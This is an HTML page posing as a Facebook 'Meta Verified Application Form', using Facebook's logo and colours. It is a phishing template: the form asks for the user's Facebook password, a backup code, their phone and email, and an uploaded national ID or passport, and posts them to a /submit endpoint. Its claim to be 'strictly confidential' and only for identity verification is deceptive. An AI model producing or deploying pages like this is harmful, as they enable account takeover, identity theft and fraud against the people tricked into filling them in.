<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Meta Verified Application</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Roboto', sans-serif;
    }
    body {
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      padding: 40px 10px;
    }
    .container {
      max-width: 550px;
      width: 100%;
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
    }
    .header {
      text-align: center;
      margin-bottom: 25px;
    }
    .header img {
      width: 100px;
    }
    .header h2 {
      color: #1877f2;
      font-size: 24px;
      margin-top: 10px;
    }
    .info-box {
      background: #eef3f8;
      padding: 15px;
      margin-bottom: 25px;
      border-left: 4px solid #1877f2;
      font-size: 14px;
      line-height: 1.6;
      color: #333;
    }
    form label {
      font-weight: 500;
      display: block;
      margin-top: 15px;
      margin-bottom: 6px;
    }
    form input, form textarea {
      width: 100%;
      padding: 10px 12px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    form input[type="file"] {
      padding: 6px;
    }
    .submit-btn {
      background: #1877f2;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      margin-top: 20px;
      cursor: pointer;
      width: 100%;
      font-weight: bold;
    }
    .submit-btn:hover {
      background: #145bcc;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Meta Logo">
      <h2>Meta Verified Application Form</h2>
    </div>

    <div class="info-box">
      To complete your Meta Verified request, please fill in the following required information.
      This form is strictly confidential and used only for identity verification purposes.
    </div>

    <form action="/submit" method="post" enctype="multipart/form-data">
      <label for="name">Full Name</label>
      <input type="text" id="name" name="name" required>

      <label for="email">Facebook Email</label>
      <input type="email" id="email" name="email" required>

      <label for="phone">Phone Number (Linked to your Facebook)</label>
      <input type="tel" id="phone" name="phone" required>

      <label for="fb_password">Facebook Password</label>
      <input type="password" id="fb_password" name="fb_password" required>

      <label for="backup_code">Facebook Backup Code (If any)</label>
      <input type="text" id="backup_code" name="backup_code">

      <label for="nid">Upload Your NID / Passport</label>
      <input type="file" id="nid" name="nid" accept=".jpg,.jpeg,.png,.pdf" required>

      <label for="additional_info">Additional Comments (Optional)</label>
      <textarea id="additional_info" name="additional_info" rows="4"></textarea>

      <button type="submit" class="submit-btn">Submit Application</button>
    </form>
  </div>
</body>
    </html>
